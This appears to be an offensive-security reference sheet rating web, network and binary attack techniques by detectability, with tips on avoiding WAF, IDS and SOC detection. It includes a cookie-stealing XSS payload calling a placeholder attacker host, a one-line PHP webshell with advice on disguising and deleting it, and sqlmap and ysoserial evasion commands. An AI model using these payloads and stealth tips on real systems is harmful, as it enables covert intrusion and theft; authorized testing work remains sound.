# OPSEC Ratings â€” Noise Level for Every Technique

> Every exploitation technique rated by detectability.
> Use this to select techniques appropriate to the engagement's stealth requirements.

---

## Rating System

- ðŸŸ¢ **Quiet** â€” Minimal log footprint, unlikely to trigger alerts, blends with normal traffic
- ðŸŸ¡ **Moderate** â€” Generates some logs/signatures, may trigger alerts if tuned, detectable on review
- ðŸ”´ **Loud** â€” Heavy log generation, triggers IDS/WAF/SIEM rules, immediately visible to SOC

---

## SQL Injection

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Manual boolean blind | ðŸŸ¢ | Single param variations per request | Near-zero â€” looks like normal browsing |
| Manual UNION (few queries) | ðŸŸ¢ | 3-5 unusual queries | WAF may flag UNION keyword |
| Time-based blind (SLEEP 2s) | ðŸŸ¢ | Slow responses in DB log | Slow query log entries, but no error |
| Error-based (extractvalue) | ðŸŸ¡ | SQL errors in app/error logs | Error log spikes, WAF SQL error rules |
| sqlmap --level 1 --risk 1 | ðŸŸ¡ | ~50-100 requests, mixed payloads | WAF anomaly score, User-Agent: sqlmap |
| sqlmap --level 3 --risk 2 | ðŸ”´ | Hundreds of requests, heavy fuzzing | WAF blocks, IDS SQLi signatures |
| sqlmap --level 5 --risk 3 | ðŸ”´ | Thousands of requests, OR/stacked queries | Immediate WAF block, SIEM alert |

**Noise Reduction:**
```bash
# Use --random-agent to avoid sqlmap User-Agent detection
sqlmap -u URL --random-agent --delay=2 --technique=T --threads=1 --batch
# --delay=2: 2 second delay between requests
# --technique=T: time-based only (quietest)
# --threads=1: single thread (no burst traffic)
```

---

## Cross-Site Scripting (XSS)

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Reflected XSS via browser | ðŸŸ¢ | Single request with payload in URL | WAF XSS rule if `<script>` present |
| Stored XSS (profile/comment) | ðŸŸ¢ | Normal POST to form field | WAF may flag on storage, fires later |
| DOM-based XSS | ðŸŸ¢ | Client-side only â€” zero server logs | Undetectable server-side |
| dalfox automated scanning | ðŸŸ¡ | Hundreds of requests with payloads | WAF XSS rules, request volume spike |
| XSS polyglot mass fuzzing | ðŸ”´ | Hundreds of exotic payloads | WAF blocks, pattern matching alerts |

**Noise Reduction:**
```bash
# Manual context-aware injection instead of automated fuzzing
# Test ONE payload that matches the injection context (see web_exploitation.md)
# Use event handlers instead of <script> tags â€” fewer WAF signatures
# <img src=x onerror=fetch('//ATTACKER/c?'+document.cookie)>
```

---

## Server-Side Request Forgery (SSRF)

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Single SSRF to metadata | ðŸŸ¢ | One outbound request from server | CloudTrail metadata access log |
| SSRF port scanning (sequential) | ðŸŸ¡ | Many internal connection attempts | Internal firewall logs, connection resets |
| SSRF to internal services | ðŸŸ¡ | Unusual internal traffic patterns | Network flow anomalies |
| Mass SSRF enumeration | ðŸ”´ | Hundreds of internal requests | IDS internal scan detection |

**Noise Reduction:**
```bash
# Target specific known endpoints rather than scanning
# Use DNS rebinding for single-request exploitation
# Space requests out: one every 5-10 seconds minimum
```

---

## File Upload / Webshell

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Single upload + one command | ðŸŸ¢ | Upload log + one GET with param | File integrity monitoring (new .php file) |
| Manual webshell (few commands) | ðŸŸ¡ | GET requests with cmd params | WAF webshell patterns, URL params like `?c=id` |
| Automated webshell (China Chopper, etc) | ðŸ”´ | POST with encoded commands | AV signatures, known webshell patterns |
| msfvenom payload upload | ðŸ”´ | Known binary signature | AV/EDR detection, Meterpreter signatures |

**Noise Reduction:**
```bash
# Use minimal PHP webshell: <?php system($_GET['c']); ?>
# Rename to blend in: config.php, helper.php, functions.php
# Delete webshell immediately after use
# Use POST instead of GET to keep commands out of access logs
```

---

## IDOR / BOLA

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Manual ID testing (5-10 IDs) | ðŸŸ¢ | Few API requests | Nearly invisible â€” looks like normal usage |
| ffuf enumeration (100 IDs) | ðŸŸ¡ | 100 rapid API requests | Rate limiting, request volume anomaly |
| Full enumeration (1000+ IDs) | ðŸ”´ | Thousands of API requests | Rate limit triggers, API abuse detection |

**Noise Reduction:**
```bash
# Add delay between requests
ffuf -u URL/FUZZ -w ids.txt -rate 2   # 2 requests per second max
# Or manual with curl + sleep
for id in 1001 1005 1010 1050 1100; do
  curl -s -H 'Cookie: session=TOKEN' "http://target/api/user/$id" >> idor_test.json
  sleep 3
done
```

---

## Deserialization

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Blind deserialization probe | ðŸŸ¡ | Serialized object in param/cookie | WAF serialization patterns (rO0AB, O:) |
| ysoserial with DNS callback | ðŸŸ¡ | DNS query from target | Outbound DNS to unusual domain |
| ysoserial with command exec | ðŸ”´ | Process execution on target | EDR process tree anomaly, command audit |
| JRMP two-stage | ðŸ”´ | Outbound connection + deser + exec | Network connection to attacker + process spawn |

**Noise Reduction:**
```bash
# Use DNS-only payload first to confirm deserialization without executing commands
# URLDNS gadget chain â€” no dependency requirements, DNS callback only
java -jar ysoserial-all.jar URLDNS 'http://deser-test.COLLAB.oastify.com' | base64 -w0
```

---

## XXE

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Basic file read (etc/passwd) | ðŸŸ¢ | XML parsing with entity expansion | WAF DTD/ENTITY rules (if present) |
| Blind OOB exfil | ðŸŸ¡ | Outbound HTTP from XML parser | Outbound connection from app server |
| SSRF via XXE | ðŸŸ¡ | Internal connections from parser | Same as SSRF signatures |

---

## Template Injection (SSTI)

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Detection probe ({{7*7}}) | ðŸŸ¢ | Single request with math expression | WAF template injection rules |
| Manual RCE payload | ðŸŸ¡ | OS command execution | Process spawn from web worker |
| tplmap automated scan | ðŸ”´ | Hundreds of template payloads | WAF blocks, request volume spike |

---

## Network Exploitation

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Metasploit `check` only | ðŸŸ¡ | Probe packets to service | IDS exploit attempt signatures |
| Metasploit full exploit | ðŸ”´ | Exploit payload + reverse connection | IDS/IPS exploit signatures, AV/EDR |
| CrackMapExec credential check | ðŸŸ¡ | SMB/SSH auth attempts | Failed login logs, brute force detection |
| Hydra brute force | ðŸ”´ | Massive auth attempts | Account lockout, SIEM brute force alerts |
| Manual SSH with known creds | ðŸŸ¢ | Single successful auth | auth.log entry (looks normal) |
| Reverse shell (bash/nc) | ðŸŸ¡ | Outbound TCP connection | Egress firewall, network flow anomaly |

---

## Binary Exploitation

| Technique | OPSEC | What It Generates | Detection Signatures |
|-----------|-------|-------------------|---------------------|
| Buffer overflow (single attempt) | ðŸŸ¡ | Service crash + restart | Crash dump, service restart log |
| Fuzzing (automated) | ðŸ”´ | Hundreds of crashes | Service instability, crash dumps |
| ROP chain exploit | ðŸŸ¡ | Unusual process behavior | EDR memory anomaly detection |

---

## Quick Reference by Engagement Type

### Red Team (Stealth Required) â€” Use ðŸŸ¢ Only
```
Manual blind SQLi, DOM XSS, IDOR (small sample), manual SSRF to specific target,
manual file upload, SSH with known creds, careful single-shot exploits
```

### Pentest (Standard) â€” Use ðŸŸ¢ and ðŸŸ¡
```
sqlmap with low settings, dalfox targeted, ffuf with rate limiting,
Metasploit check, CrackMapExec, manual webshells, controlled reverse shells
```

### Bug Bounty (Impact Focused) â€” ðŸŸ¢ðŸŸ¡ðŸ”´ Acceptable
```
Full sqlmap, automated scanning, mass enumeration â€” but respect rate limits
and program rules. Avoid causing service disruption.
```
